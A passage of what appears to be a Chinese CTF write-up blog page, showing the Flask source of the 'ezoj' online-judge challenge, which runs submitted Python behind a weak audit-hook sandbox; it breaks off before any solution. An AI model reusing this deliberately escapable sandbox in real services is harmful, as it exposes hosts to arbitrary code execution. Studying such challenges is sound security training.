@@ -1,0 +1,793 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="buuctf,regexp注入" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">
+
+
+
+  <title>
+aliyunctf部分复现 - 比赛复现 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">aliyunctf部分复现
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2025-02-25 16:04:09">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2025-02-25T16:04:09+08:00">2025-02-25</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?740085"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?904277"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?122229"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?340063"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?592795"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?878940"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="In 比赛复现"><span itemprop="name">比赛复现</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h3 id="ezoj"><a class="anchor" href="#ezoj">#</a> ezoj：</h3>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251942533.png" alt="image-20250225194258372" /></p>
+<p>是一个判题的系统</p>
+<p>/source 源码：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> subprocess</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> uuid</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_file</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>SUBMISSIONS_PATH <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"./submissions"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>PROBLEMS_PATH <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"./problems"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>SUBMISSIONS_PATH<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>parents<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>CODE_TEMPLATE <span class="token operator">=</span> <span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="16"></td><td><pre>import sys</pre></td></tr><tr><td data-num="17"></td><td><pre>import math</pre></td></tr><tr><td data-num="18"></td><td><pre>import collections</pre></td></tr><tr><td data-num="19"></td><td><pre>import queue</pre></td></tr><tr><td data-num="20"></td><td><pre>import heapq</pre></td></tr><tr><td data-num="21"></td><td><pre>import bisect</pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>def audit_checker(event,args):</pre></td></tr><tr><td data-num="24"></td><td><pre>    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:</pre></td></tr><tr><td data-num="25"></td><td><pre>        raise RuntimeError</pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>sys.addaudithook(audit_checker)</pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>"""</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">OJTimeLimitExceed</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">OJRuntimeError</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"static/index.html"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"server.py"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/problems"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token keyword">def</span> <span class="token function">list_problems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    problems_dir <span class="token operator">=</span> PROBLEMS_PATH</pre></td></tr><tr><td data-num="54"></td><td><pre>    problems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">for</span> problem <span class="token keyword">in</span> problems_dir<span class="token punctuation">.</span>iterdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        problem_config_file <span class="token operator">=</span> problem <span class="token operator">/</span> <span class="token string">"problem.json"</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> problem_config_file<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="58"></td><td><pre>            <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>        problem_config <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>problem_config_file<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        problem <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            <span class="token string">"problem_id"</span><span class="token punctuation">:</span> problem<span class="token punctuation">.</span>name<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="63"></td><td><pre>            <span class="token string">"name"</span><span class="token punctuation">:</span> problem_config<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="64"></td><td><pre>            <span class="token string">"description"</span><span class="token punctuation">:</span> problem_config<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>        problems<span class="token punctuation">.</span>append<span class="token punctuation">(</span>problem<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre>    problems <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>problems<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"problem_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre></pre></td></tr><tr><td data-num="70"></td><td><pre>    problems <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"problems"</span><span class="token punctuation">:</span> problems<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>problems<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span></pre></td></tr><tr><td data-num="72"></td><td><pre></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/submit"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token keyword">def</span> <span class="token function">submit_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        code <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre>        problem_id <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"problem_id"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>        <span class="token keyword">if</span> code <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> problem_id <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="82"></td><td><pre>            <span class="token keyword">return</span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="83"></td><td><pre>                jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Missing 'code' or 'problem_id'"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="84"></td><td><pre>                <span class="token number">400</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="85"></td><td><pre>            <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre></pre></td></tr><tr><td data-num="87"></td><td><pre>        problem_id <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>problem_id<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre>        problem_dir <span class="token operator">=</span> PROBLEMS_PATH <span class="token operator">/</span> problem_id</pre></td></tr><tr><td data-num="89"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> problem_dir<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="90"></td><td><pre>            <span class="token keyword">return</span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="91"></td><td><pre>                jsonify<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="92"></td><td><pre>                    <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Problem ID </span><span class="token interpolation"><span class="token punctuation">&#123;</span>problem_id<span class="token punctuation">&#125;</span></span><span class="token string"> not found!"</span></span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>                <span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="94"></td><td><pre>                <span class="token number">404</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="95"></td><td><pre>            <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre>        code_filename <span class="token operator">=</span> SUBMISSIONS_PATH <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"submission_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span></pre></td></tr><tr><td data-num="98"></td><td><pre>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> code_file<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="99"></td><td><pre>            code <span class="token operator">=</span> CODE_TEMPLATE <span class="token operator">+</span> code</pre></td></tr><tr><td data-num="100"></td><td><pre>            code_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="101"></td><td><pre></pre></td></tr><tr><td data-num="102"></td><td><pre>        result <span class="token operator">=</span> judge<span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> problem_dir<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="103"></td><td><pre></pre></td></tr><tr><td data-num="104"></td><td><pre>        code_filename<span class="token punctuation">.</span>unlink<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="107"></td><td><pre></pre></td></tr><tr><td data-num="108"></td><td><pre>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="109"></td><td><pre>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span></pre></td></tr><tr><td data-num="110"></td><td><pre></pre></td></tr><tr><td data-num="111"></td><td><pre></pre></td></tr><tr><td data-num="112"></td><td><pre><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> problem_dir<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="113"></td><td><pre>    test_files <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>problem_dir<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">"*.input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="114"></td><td><pre>    total_tests <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_files<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="115"></td><td><pre>    passed_tests <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="116"></td><td><pre></pre></td></tr><tr><td data-num="117"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="118"></td><td><pre>        <span class="token keyword">for</span> test_file <span class="token keyword">in</span> test_files<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="119"></td><td><pre>            input_file <span class="token operator">=</span> test_file</pre></td></tr><tr><td data-num="120"></td><td><pre>            expected_output_file <span class="token operator">=</span> problem_dir <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_file<span class="token punctuation">.</span>stem<span class="token punctuation">&#125;</span></span><span class="token string">.output"</span></span></pre></td></tr><tr><td data-num="121"></td><td><pre></pre></td></tr><tr><td data-num="122"></td><td><pre>            <span class="token keyword">if</span> <span class="token keyword">not</span> expected_output_file<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="123"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="124"></td><td><pre></pre></td></tr><tr><td data-num="125"></td><td><pre>            case_passed <span class="token operator">=</span> run_code<span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> input_file<span class="token punctuation">,</span> expected_output_file<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre>            <span class="token keyword">if</span> case_passed<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="128"></td><td><pre>                passed_tests <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="129"></td><td><pre></pre></td></tr><tr><td data-num="130"></td><td><pre>        <span class="token keyword">if</span> passed_tests <span class="token operator">==</span> total_tests<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="131"></td><td><pre>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"AC"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Accepted"</span></span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="133"></td><td><pre>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>                <span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"WA"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="135"></td><td><pre>                <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Wrang Answer: pass(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passed_tests<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>total_tests<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="136"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="137"></td><td><pre>    <span class="token keyword">except</span> OJRuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="138"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"RE"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Runtime Error: ret=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>    <span class="token keyword">except</span> OJTimeLimitExceed<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="140"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"TLE"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Time Limit Exceed"</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre></pre></td></tr><tr><td data-num="142"></td><td><pre></pre></td></tr><tr><td data-num="143"></td><td><pre><span class="token keyword">def</span> <span class="token function">run_code</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> input_file<span class="token punctuation">,</span> expected_output_file<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="144"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> infile<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="145"></td><td><pre>        expected_output_file<span class="token punctuation">,</span> <span class="token string">"r"</span></pre></td></tr><tr><td data-num="146"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">as</span> expected_output<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="147"></td><td><pre>        expected_output_content <span class="token operator">=</span> expected_output<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="148"></td><td><pre></pre></td></tr><tr><td data-num="149"></td><td><pre>        process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="150"></td><td><pre>            <span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> code_filename<span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="151"></td><td><pre>            stdin<span class="token operator">=</span>infile<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="152"></td><td><pre>            stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="153"></td><td><pre>            stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="154"></td><td><pre>            text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="155"></td><td><pre>        <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="156"></td><td><pre></pre></td></tr><tr><td data-num="157"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="158"></td><td><pre>            stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="159"></td><td><pre>        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="160"></td><td><pre>            process<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="161"></td><td><pre>            <span class="token keyword">raise</span> OJTimeLimitExceed</pre></td></tr><tr><td data-num="162"></td><td><pre></pre></td></tr><tr><td data-num="163"></td><td><pre>        <span class="token keyword">if</span> process<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="164"></td><td><pre>            <span class="token keyword">raise</span> OJRuntimeError<span class="token punctuation">(</span>process<span class="token punctuation">.</span>returncode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="165"></td><td><pre></pre></td></tr><tr><td data-num="166"></td><td><pre>        <span class="token keyword">if</span> stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> expected_output_content<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="167"></td><td><pre>            <span class="token keyword">return</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="168"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="169"></td><td><pre>            <span class="token keyword">return</span> <span class="token boolean">False</span></pre></td></tr><tr><td 